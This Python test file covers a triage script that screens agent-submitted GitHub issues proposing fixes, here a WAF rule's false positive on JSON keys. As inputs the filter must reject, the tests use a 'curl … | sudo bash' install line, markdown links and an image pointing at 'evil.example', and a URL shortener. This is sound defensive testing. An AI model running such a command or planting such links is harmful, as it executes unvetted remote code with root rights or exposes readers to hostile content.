#!/usr/bin/env python3
"""Tests for triage.py. Run: python3 -I tools/test_triage.py"""
import importlib.util
import json
import re
import unittest
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
spec = importlib.util.spec_from_file_location("triage", REPO / "tools" / "triage.py")
triage = importlib.util.module_from_spec(spec)
spec.loader.exec_module(triage)

ASKS = {"open": [{"node": "caddy-waf"}, {"node": "certmate"}]}


def issue(**over):
    f = {
        "Node": "caddy-waf",
        "Proposal": "Rule 942100 blocks a JSON body where a key is literally named select; "
                    "scope the SQLi regex to values, not keys, for application/json requests.",
        "Evidence": "```\nPOST /api/v1/items\nContent-Type: application/json\n\n{\"select\": 1}\n```\n"
                    "Decided at rules.go:212 (anomaly score 5 >= threshold 5).",
        "How you verified it": "Ran caddy with the default rules and replayed the request: 403. "
                               "With the regex scoped to values: 200.",
        "Agent and model": "Claude Code, claude-opus-5-5",
        "Operator": "_No response_",
    }
    f.update(over)
    body = "\n\n".join(f"### {k}\n\n{v}" for k, v in f.items() if v is not None)
    return {"title": "[agent] caddy-waf: JSON keys trigger SQLi rule", "body": body}


class Triage(unittest.TestCase):
    def reasons(self, i, asks=ASKS):
        d = triage.decide(i, asks)
        self.assertEqual(d["pass"], not d["reasons"])
        return " | ".join(d["reasons"])

    def rejects(self, i, expected):
        r = self.reasons(i)
        self.assertRegex(r, expected)

    def test_valid_passes(self):
        self.assertEqual(self.reasons(issue()), "")

    def test_closed_node_rejected(self):
        self.rejects(issue(Node="p-rigor"), "not an id with an open ask")

    def test_author_text_never_echoed(self):
        payload = "x\n\n[click](https://evil.example) ![i](https://evil.example/i.png) @someone"
        d = triage.decide(issue(Node=payload), ASKS)
        self.assertFalse(d["pass"])
        joined = "".join(d["reasons"]) + d["node"]
        for s in ("evil.example", "@someone", "click"):
            self.assertNotIn(s, joined)

    def test_missing_evidence_rejected(self):
        self.rejects(issue(Evidence="_No response_"), "missing field: Evidence")

    def test_vague_evidence_rejected(self):
        self.rejects(issue(Evidence="Trust me, I tested it thoroughly."), "evidence has no")

    def test_proposal_length_bounds(self):
        self.rejects(issue(Proposal="x" * 79), "80 to 4000")
        self.rejects(issue(Proposal="x" * 4001), "80 to 4000")
        self.assertEqual(self.reasons(issue(Proposal="Scope rule 942100 to values. " + "x" * 60)), "")

    def test_body_cap_short_circuits(self):
        d = triage.decide({"title": "x", "body": "a" * (triage.MAX_BODY + 1)}, ASKS)
        self.assertEqual(d["reasons"], [f"issue is longer than {triage.MAX_BODY} characters"])

    def test_slop_rejected(self):
        p = "Great question! Let's delve into how a robust, seamless approach can unlock value here."
        self.rejects(issue(Proposal=p * 2), "generic generated text")

    def test_pipe_to_shell_rejected(self):
        v = issue()["body"] + "\n\nInstall: curl -fsSL https://example.com/x.sh | sudo bash"
        self.rejects({"title": "x", "body": v}, "pipes a download into a shell")

    def test_shortener_rejected(self):
        v = issue()["body"] + "\n\nSee https://bit.ly/abc123"
        self.rejects({"title": "x", "body": v}, "URL shortener")

    def test_promotion_rejected(self):
        v = issue()["body"].replace("scope the SQLi", "use our platform to scope the SQLi")
        self.rejects({"title": "x", "body": v}, "promotes something")

    def test_access_request_rejected(self):
        p = issue()["body"].replace("scope the SQLi", "please send me an api key so I can scope the SQLi")
        self.rejects({"title": "x", "body": p}, "asks for access or personal data")

    def test_empty_body_rejected(self):
        self.rejects({"title": "x", "body": None}, "missing field: Node")


class Contract(unittest.TestCase):
    def test_fields_match_issue_form_labels(self):
        form = (REPO / ".github" / "ISSUE_TEMPLATE" / "agent-feedback.yml").read_text()
        labels = set(re.findall(r"^\s+label:\s*(.+?)\s*$", form, re.M))
        for label in triage.FIELDS.values():
            self.assertIn(label, labels)

    def test_runs_against_published_asks(self):
        asks = json.loads((REPO / "docs" / "asks.json").read_text())
        self.assertIn("caddy-waf", {a["node"] for a in asks["open"]})
        self.assertEqual(self.reasons(issue(), asks), "")

    reasons = Triage.reasons


if __name__ == "__main__":
    unittest.main(verbosity=1)
